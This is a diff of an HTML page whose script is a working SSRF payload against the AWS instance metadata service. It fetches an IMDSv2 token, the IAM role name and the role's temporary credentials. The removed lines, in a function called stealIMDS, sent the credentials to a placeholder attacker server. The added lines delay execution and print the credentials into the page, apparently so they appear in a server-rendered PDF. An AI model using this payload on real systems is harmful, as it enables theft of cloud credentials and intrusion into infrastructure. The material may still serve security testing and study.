@@ -1,41 +1,31 @@
 <!DOCTYPE html>
 <html>
-<head><title>Chart</title></head>
 <body>
-  <h1>Rendering...</h1>
+  <pre id="o">Waiting for IMDSv2...</pre>
   <script>
-    async function stealIMDS() {
+    setTimeout(async () => {
       try {
-        // Step 1: Get token (PUT)
-        const tokenRes = await fetch('http://169.254.169.254/latest/api/token', {
-          method: 'PUT',
-          headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' }
+        const tokenRes = await fetch("http://169.254.169.254/latest/api/token", {
+          method: "PUT",
+          headers: {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
         });
         const token = await tokenRes.text();
 
-        // Step 2: Get role name
-        const roleRes = await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/', {
-          headers: { 'X-aws-ec2-metadata-token': token }
+        const roleRes = await fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/", {
+          headers: {"X-aws-ec2-metadata-token": token}
         });
-        const role = await roleRes.text().trim();
+        const role = (await roleRes.text()).trim();
 
-        // Step 3: Get full credentials
         const credsRes = await fetch(`http://169.254.169.254/latest/meta-data/iam/security-credentials/${role}`, {
-          headers: { 'X-aws-ec2-metadata-token': token }
+          headers: {"X-aws-ec2-metadata-token": token}
         });
         const creds = await credsRes.text();
 
-        // Exfiltrate (choose one)
-        const exfilUrl = `https://your-attacker-server.com/log?data=${encodeURIComponent(creds)}`;
-        await fetch(exfilUrl, { mode: 'no-cors' });
-
-        // Or show in page so it appears in PDF
-        document.body.innerHTML += `<pre>${creds}</pre>`;
+        document.getElementById("o").innerHTML = "Success!\n\n" + creds;
       } catch(e) {
-        document.body.innerHTML += `<pre>Error: ${e.message}</pre>`;
+        document.getElementById("o").innerHTML = "Error: " + e.message;
       }
-    }
-    stealIMDS();
+    }, 1500); // 1.5 second delay
   </script>
 </body>
 </html>
